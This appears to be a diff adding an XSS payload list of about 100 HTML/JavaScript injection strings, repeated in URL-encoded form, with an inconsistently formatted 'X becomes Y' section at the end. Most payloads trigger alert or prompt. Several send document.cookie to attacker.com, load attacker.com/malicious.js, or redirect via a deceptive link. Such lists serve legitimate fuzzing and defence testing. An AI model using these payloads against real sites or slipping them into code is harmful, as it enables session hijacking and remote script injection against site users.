@@ -1,0 +1,200 @@
+<script>alert('XSS1');</script>
+<img src=x onerror=alert('XSS2');>
+'><script>alert('XSS3');</script>
+<img src="x" onerror="alert('XSS4');">
+<body onload=alert('XSS5')>
+<a href="javascript:alert('XSS6');">Click me</a>
+<img src="x" onmouseover="alert('XSS7');">
+<svg/onload=alert('XSS8')>
+<script>document.location='https://attacker.com/xss?cookie='+document.cookie + '&payload=XSS9';</script>
+<input type="text" value="javascript:alert('XSS10');" />
+<img """><script>alert('XSS11');</script>" />
+<script>alert(&#x27;XSS12&#x27;);</script>
++ADw-script+AD4-alert('XSS13');+ADw-/script+AD4-
+<img src="x" onerror="alert('XSS14');">
+<a href="javascript:alert('XSS15');">Click me</a>
+<img src=x onerror=alert('XSS16'); />
+<div style="background-image: url('data:image/svg+xml,<svg/onload=alert('XSS17')>')"></div>
+TRACE / HTTP/1.1<svg onload=alert('XSS18')>
+<a href="http://attacker.com" target="_blank" rel="noopener noreferrer" onclick="setTimeout(function(){ window.location='https://legitimate-site.com'; }, 5000);">Click me</a>
+<iframe src="javascript:alert('XSS19');"></iframe>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
+<script>prompt('XSS21');</script>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
+<img src="x" onerror="javascript:alert('XSS24');">
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click me</a>
+<svg onload="javascript:alert('XSS26');"></svg>
+<script src="https://attacker.com/malicious.js"></script>
+<svg/onload=location='https://attacker.com/xss?cookie='+document.cookie + '&payload=XSS28';>
+<img src="x" onerror="prompt('XSS29');">
+<marquee onstart='javascript:alert('XSS30')'>Start</marquee>
+<audio src="javascript:alert('XSS31');" />
+<video poster="javascript:alert('XSS32');"></video>
+<div oninput=alert('XSS33') tabindex=1 contenteditable>
+<form action="javascript:alert('XSS34');"><input type="submit"></form>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>
+<svg xmlns="http://www.w3.org/2000/svg" onload="javascript:alert('XSS36');" />
+<a href="javascript:void(0)" onmouseover="javascript:alert('XSS37');">Click me</a>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert('XSS38')"></div>
+<a href="javascript:void(0)" onmouseover="prompt('XSS39');">Click me</a>
+<svg><script>/*<%-1*/confirm('XSS40');</script></svg>
+<svg><script>document.write('XSS41');</script></svg>
+<img src='x:x' onerror='alert("XSS42")'>
+<svg onload=alert(/XSS43/)
+<a href="data:text/html,<script>alert('XSS44');</script>">Click me</a>
+<a href="javascript:void(0)" onmouseover="javascript:alert('XSS45');">Click me</a>
+<math><a xlink:href="//attacker.com">Click me</a></math>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS47');">
+<svg><script>document.location='https://attacker.com/xss?cookie='+document.cookie + '&payload=XSS48';</script></svg>
+<base href="javascript:alert('XSS49');//">
+<div style="position:fixed;top:0;left:0;width:100%;height:100%" onpointerenter=alert('XSS50')></div>
+<script>alert('XSS51');</script>
+<img src=x onerror=alert('XSS52');>
+'><script>alert('XSS53');</script>
+<img src="x" onerror="alert('XSS54');">
+<body onload=alert('XSS55')>
+<a href="javascript:alert('XSS56');">Click me</a>
+<img src="x" onmouseover="alert('XSS57');">
+<svg/onload=alert('XSS58')>
+<script>document.location='https://attacker.com/xss?cookie='+document.cookie + '&payload=XSS59';</script>
+<input type="text" value="javascript:alert('XSS60');" />
+<img """><script>alert('XSS61');</script>" />
+<script>alert(&#x27;XSS62&#x27;);</script>
++ADw-script+AD4-alert('XSS63');+ADw-/script+AD4-
+<img src="x" onerror="alert('XSS64');">
+<a href="javascript:alert('XSS65');">Click me</a>
+<img src=x onerror=alert('XSS66'); />
+<div style="background-image: url('data:image/svg+xml,<svg/onload=alert('XSS67')>')"></div>
+TRACE / HTTP/1.1<svg onload=alert('XSS68')>
+<a href="http://attacker.com" target="_blank" rel="noopener noreferrer" onclick="setTimeout(function(){ window.location='https://legitimate-site.com'; }, 5000);">Click me</a>
+<iframe src="javascript:alert('XSS69');"></iframe>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
+<script>prompt('XSS71');</script>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
+<img src="x" onerror="javascript:alert('XSS73');">
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click me</a>
+<svg onload="javascript:alert('XSS75');"></svg>
+<script src="https://attacker.com/malicious.js"></script>
+<svg/onload=location='https://attacker.com/xss?cookie='+document.cookie + '&payload=XSS77';>
+<img src="x" onerror="prompt('XSS78');">
+<marquee onstart='javascript:alert('XSS79')'>Start</marquee>
+<audio src="javascript:alert('XSS80');" />
+<video poster="javascript:alert('XSS81');"></video>
+<div oninput=alert('XSS82') tabindex=1 contenteditable>
+<form action="javascript:alert('XSS83');"><input type="submit"></form>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>
+<svg xmlns="http://www.w3.org/2000/svg" onload="javascript:alert('XSS85');" />
+<a href="javascript:void(0)" onmouseover="javascript:alert('XSS86');">Click me</a>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert('XSS87')"></div>
+<a href="javascript:void(0)" onmouseover="prompt('XSS88');">Click me</a>
+<svg><script>/*<%-1*/confirm('XSS89');</script></svg>
+<svg><script>document.write('XSS90');</script></svg>
+<img src='x:x' onerror='alert("XSS91")'>
+<svg onload=alert(/XSS92/)
+<a href="data:text/html,<script>alert('XSS93');</script>">Click me</a>
+<a href="javascript:void(0)" onmouseover="javascript:alert('XSS94');">Click me</a>
+<math><a xlink:href="//attacker.com">Click me</a></math>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS96');">
+<svg><script>document.location='https://attacker.com/xss?cookie='+document.cookie + '&payload=XSS97';</script></svg>
+<base href="javascript:alert('XSS98');//">
+<div style="position:fixed;top:0;left:0;width:100%;height:100%" onpointerenter=alert('XSS99')></div>
+%3Cscript%3Ealert('XSS1')%3C/script%3E
+%3Cimg%20src=x%20onerror=alert('XSS2')%3E
+%27%3E%3Cscript%3Ealert('XSS3')%3C/script%3E
+%3Cimg%20src=%22x%22%20onerror=%22alert('XSS4')%22%3E
+%3Cbody%20onload=alert('XSS5')%3E
+%3Ca%20href=%22javascript:alert('XSS6')%22%3EClick%20me%3C/a%3E
+%3Cimg%20src=%22x%22%20onmouseover=%22alert('XSS7')%22%3E
+%3Csvg/onload=alert('XSS8')%3E
+%3Cscript%3Edocument.location='https://attacker.com/xss?cookie='+document.cookie+'&payload=XSS9'%3C/script%3E
+%3Cinput%20type=%22text%22%20value=%22javascript:alert('XSS10')%22%20/%3E
+%3Cimg%20%22%22%22%3E%3Cscript%3Ealert('XSS11')%3C/script%3E%22%20/%3E
+%3Cscript%3Ealert(%27XSS12%27)%3C/script%3E
+%2BADw-script%2BAD4-alert('XSS13')%2BADw-/script%2BAD4-
+%3Cimg%20src=%22x%22%20onerror=%22alert('XSS14')%22%3E
+%3Ca%20href=%22javascript:alert('XSS15')%22%3EClick%20me%3C/a%3E
+%3Cimg%20src=x%20onerror=alert('XSS16')%20/%3E
+%3Cdiv%20style=%22background-image:%20url('data:image/svg+xml,%3Csvg/onload=alert('XSS17')%3E')%22%3E%3C/div%3E
+TRACE%20/%20HTTP/1.1%3Csvg%20onload=alert('XSS18')%3E
+%3Ca%20href=%22http://attacker.com%22%20target=%22_blank%22%20rel=%22noopener%20noreferrer%22%20onclick=%22setTimeout(function(){%20window.location='https://legitimate-site.com';%20},%205000);%22%3EClick%20me%3C/a%3E
+%3Ciframe%20src=%22javascript:alert('XSS19')%22%3E%3C/iframe%3E
+%3Cimg%20src=%22x%22%20onerror=%22alert(String.fromCharCode(88,83,83))%22%3E
+%3Cscript%3Eprompt('XSS21')%3C/script%3E
+%3Cimg%20src=%22x%22%20onerror=%22alert(String.fromCharCode(88,83,83))%22%3E
+%3Cimg%20src=%22x%22%20onerror=%22javascript:alert('XSS24')%22%3E
+%3Ca%20href=%22javascript:alert(String.fromCharCode(88,83,83))%22%3EClick%20me%3C/a%3E
+%3Csvg%20onload=%22javascript:alert('XSS26')%22%3E%3C/svg%3E
+%3Cscript%20src=%22https://attacker.com/malicious.js%22%3E%3C/script%3E
+%3Csvg/onload=location='https://attacker.com/xss?cookie='+document.cookie+'&payload=XSS28'%3E
+%3Cimg%20src=%22x%22%20onerror=%22prompt('XSS29')%22%3E
+%3Cmarquee%20onstart=%22javascript:alert('XSS30')%22%3EStart%3C/marquee%3E
+%3Caudio%20src=%22javascript:alert('XSS31')%22%20/%3E
+%3Cvideo%20poster=%22javascript:alert('XSS32')%22%3E%3C/video%3E
+%3Cdiv%20oninput=alert('XSS33')%20tabindex=1%20contenteditable%3E
+%3Cform%20action=%22javascript:alert('XSS34')%22%3E%3Cinput%20type=%22submit%22%3E%3C/form%3E
+%3Ca%20href=%22data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=%22%3EClick%20me%3C/a%3E
+%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=%22javascript:alert('XSS36')%22%3E%3C/svg%3E
+%3Ca%20href=%22javascript:void(0)%22%20onmouseover=%22javascript:alert('XSS37')%22%3EClick%20me%3C/a%3E
+%3Cstyle%3E@keyframes%20x%7B%7D%3C/style%3E%3Cdiv%20style=%22animation-name:x%22%20onanimationstart=%22alert('XSS38')%22%3E%3C/div%3E
+%3Ca%20href=%22javascript:void(0)%22%20onmouseover=%22prompt('XSS39')%22%3EClick%20me%3C/a%3E
+%3Csvg%3E%3Cscript%3E/*%3C%-1*/confirm('XSS40')%3B%3C/script%3E%3C/svg%3E
+%3Csvg%3E%3Cscript%3Edocument.write('XSS41')%3C/script%3E%3C/svg%3E
+%3Cimg%20src='x:x'%20onerror='alert("XSS42")'%3E
+%3Csvg%20onload=alert(/XSS43/)
+%3Ca%20href=%22data:text/html,%3Cscript%3Ealert('XSS44')%3C/script%3E%22%3EClick%20me%3C/a%3E
+%3Ca%20href=%22javascript:void(0)%22%20onmouseover=%22javascript:alert('XSS45')%22%3EClick%20me%3C/a%3E
+%3Cmath%3E%3Ca%20xlink:href=%22//attacker.com%22%3EClick%20me%3C/a%3E%3C/math%3E
+%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=javascript:alert('XSS47')%22%3E
+%3Csvg%3E%3Cscript%3Edocument.location='https://attacker.com/xss?cookie='+document.cookie+'&payload=XSS48'%3B%3C/script%3E%3C/svg%3E
+%3Cbase%20href=%22javascript:alert('XSS49')%3B//%22%3E
+%3Cdiv%20style=%22position:fixed;top:0;left:0;width:100%;height:100%25%22%20onpointerenter=alert('XSS50')%3E%3C/div%3E
+%3Cscript%3Ealert('XSS51')%3C/script%3E
+%3Cimg%20src=x%20onerror=alert('XSS52')%3E
+%27%3E%3Cscript%3Ealert('XSS53')%3C/script%3E
+%3Cimg%20src=%22x%22%20onerror=%22alert('XSS54')%22%3E
+%3Cbody%20onload=alert('XSS55')%3E
+%3Ca%20href=%22javascript:alert('XSS56')%22%3EClick%20me%3C/a%3E
+%3Cimg%20src=%22x%22%20onmouseover=%22alert('XSS57')%22%3E
+%3Csvg/onload=alert('XSS58')%3E
+%3Cscript%3Edocument.location='https://attacker.com/xss?cookie='+document.cookie+'&payload=XSS59'%3C/script%3E
+%3Cinput%20type=%22text%22%20value=%22javascript:alert('XSS60')%22%20/%3E
+%3Cimg%20%22%22%22%3E%3Cscript%3Ealert('XSS61')%3C/script%3E%22%20/%3E
+%3Cscript%3Ealert(%27XSS62%27)%3C/script%3E
+%2BADw-script%2BAD4-alert('XSS63')%2BADw-/script%2BAD4-
+%3Cimg%20src=%22x%22%20onerror=%22alert('XSS64')%22%3E
+%3Ca%20href=%22javascript:alert('XSS65')%22%3EClick%20me%3C/a%3E
+%3Cimg%20src=x%20onerror=alert('XSS66')%20/%3E
+%3Cdiv%20style=%22background-image:%20url('data:image/svg+xml,%3Csvg/onload=alert('XSS67')%3E')%22%3E%3C/div%3E
+TRACE%20/%20HTTP/1.1%3Csvg%20onload=alert('XSS68')%3E
+%3Ca%20href=%22http://attacker.com%22%20target=%22_blank%22%20rel=%22noopener%20noreferrer%22%20onclick=%22setTimeout(function(){%20window.location='https://legitimate-site.com';%20},%205000);%22%3EClick%20me%3C/a%3E
+%3Ciframe%20src=%22javascript:alert('XSS69')%22%3E%3C/iframe%3E
+%3Cimg%20src=%22x%22%20onerror=%22alert(String.fromCharCode(88,83,83))%22%3E
+%3Cscript%3Eprompt('XSS71')%3C/script%3E
+%3Cimg%20src=%22x%22%20onerror=%22alert(String.fromCharCode(88,83,83))%22%3E
+%3Cimg%20src=%22x%22%20onerror=%22javascript:alert('XSS73')%22%3E
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click me</a> becomes %3Ca%20href=%22javascript:alert(String.fromCharCode(88,83,83))%22%3EClick%20me%3C/a%3E
+<svg onload="javascript:alert('XSS75');"></svg> becomes %3Csvg%20onload=%22javascript:alert('XSS75');%22%3E%3C/svg%3E
+<script src="https://attacker.com/malicious.js"></script> becomes %3Cscript%20src=%22https://attacker.com/malicious.js%22%3E%3C/script%3E
+<svg/onload=location='https://attacker.com/xss?cookie='+document.cookie + '&payload=XSS77';> becomes %3Csvg/onload=location='https://attacker.com/xss?cookie='+document.cookie%20+%20'&payload=XSS77';%3E
+<img src="x" onerror="prompt('XSS78');"> becomes %3Cimg%20src=%22x%22%20onerror=%22prompt('XSS78');%22%3E
+<marquee onstart='javascript:alert('XSS79')'>Start</marquee> becomes %3Cmarquee%20onstart='javascript:alert('XSS79')'%3EStart%3C/marquee%3E
+<audio src="javascript:alert('XSS80');" /> becomes %3Caudio%20src=%22javascript:alert('XSS80');%22%20/%3E
+<video poster="javascript:alert('XSS81');"></video> becomes %3Cvideo%20poster=%22javascript:alert('XSS81');%22%3E%3C/video%3E
+<div oninput=alert('XSS82') tabindex=1 contenteditable> becomes %3Cdiv%20oninput=alert('XSS82')%20tabindex=1%20contenteditable%3E
+<form action="javascript:alert('XSS83');"><input type="submit"></form> becomes %3Cform%20action=%22javascript:alert('XSS83');%22%3E%3Cinput%20type=%22submit%22%3E%3C/form%3E
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a> becomes %3Ca%20href=%22data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=%22%3EClick%20me%3C/a%3E
+<svg xmlns="http://www.w3.org/2000/svg" onload="javascript:alert('XSS85');" /> becomes %3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=%22javascript:alert('XSS85');%22%20/%3E
+<a href="javascript:void(0)" onmouseover="javascript:alert('XSS86');">Click me</a> becomes %3Ca%20href=%22javascript:void(0)%22%20onmouseover=%22javascript:alert('XSS86');%22%3EClick%20me%3C/a%3E
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert('XSS87')"></div> becomes %3Cstyle%3E@keyframes%20x{}%3C/style%3E%3Cdiv%20style=%22animation-name:x%22%20onanimationstart=%22alert('XSS87')%22%3E%3C/div%3E
+<a href="javascript:void(0)" onmouseover="prompt('XSS88');">Click me</a> becomes %3Ca%20href=%22javascript:void(0)%22%20onmouseover=%22prompt('XSS88');%22%3EClick%20me%3C/a%3E
+<svg><script>/*<%-1*/confirm('XSS89');</script></svg> becomes %3Csvg%3E%3Cscript%3E/*<%-1*/confirm('XSS89');%3C/script%3E%3C/svg%3E
+<svg><script>document.write('XSS90');</script></svg> becomes %3Csvg%3E%3Cscript%3Edocument.write('XSS90');%3C/script%3E%3C/svg%3E
+<img src='x:x' onerror='alert("XSS91")'> becomes %3Cimg%20src='x:x'%20onerror='alert("XSS91")'%3E
+<svg onload=alert(/XSS92/) becomes %3Csvg%20onload=alert(/XSS92/)%3E
+<a href="data:text/html,<script>alert('XSS93');</script>">Click me</a> becomes %3Ca%20href=%22data:text/html,%3Cscript%3Ealert('XSS93');%3C/script%3E%22%3EClick%20me%3C/a%3E
+<a href="javascript:void(0)" onmouseover="javascript:alert('XSS94');">Click me</a> becomes %3Ca%20href=%22javascript:void(0)%22%20onmouseover=%22javascript:alert('XSS94');%22%3EClick%20me%3C/a%3E
+<math><a xlink:href="//attacker.com">Click me</a></math> becomes %3Cmath%3E%3Ca%20xlink:href='//attacker.com'%3EClick%20me%3C/a%3E%3C/math%3E
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS96');"> becomes %3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=javascript:alert('XSS96');%22%3E
+<svg><script>document.location='https://attacker.com/xss?cookie='+document.cookie + '&payload=XSS97';</script></svg> becomes %3Csvg%3E%3Cscript%3Edocument.location='https://attacker.com/xss?cookie='+document.cookie%20+%20'&payload=XSS97';%3C/script%3E%3C/svg%3E
+<base href="javascript:alert('XSS98');//"> becomes %3Cbase%20href=%22javascript:alert('XSS98');//%22%3E
+<div style="position:fixed;top:0;left:0;width:100%;height:100%" onpointerenter=alert('XSS99')></div> becomes %3Cdiv%20style=%22position:fixed;top:0;left:0;width:100%;height:100%25%22%20onpointerenter=alert('XSS99')%3E%3C/div%3E
